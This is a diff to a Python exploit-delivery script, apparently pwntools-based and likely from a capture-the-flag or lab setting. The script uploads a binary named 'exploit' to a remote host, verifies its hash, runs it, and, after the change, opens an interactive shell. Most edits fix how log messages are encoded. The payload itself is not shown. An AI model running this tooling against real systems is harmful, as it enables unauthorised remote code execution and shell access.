@@ -24,7 +24,7 @@ def send_command(command: bytes,
                  print_command=True,
                  print_result=True) -> bytes:
     if print_command:
-        info(f"Sending command '{command.decode('ascii')}'".encode("ascii"))
+        info(f"Sending command '{command.decode('ascii')}'")
 
     io.sendline(command)
 
@@ -32,7 +32,7 @@ def send_command(command: bytes,
     result = result[:result.rfind(b"\n")][len(command) + 2:]
 
     if result != b"" and print_result:
-        info(result)
+        info(result.decode('ascii'))
 
     return result
 
@@ -84,8 +84,10 @@ send_command(b"chmod +x exploit")
 remote_exploit_hash_raw = send_command(b"sha256sum exploit", print_result=False)
 remote_exploit_hash = remote_exploit_hash_raw.decode("ascii").split(" ")[0]
 if remote_exploit_hash != local_exploit_hash:
-    error(b"Remote exploit was not transferred correctly.")
+    error("Remote exploit was not transferred correctly.")
     exit(1)
 
 # Execute exploit
-send_command(b"./exploit")
+io.sendline(b"./exploit")
+
+io.interactive()
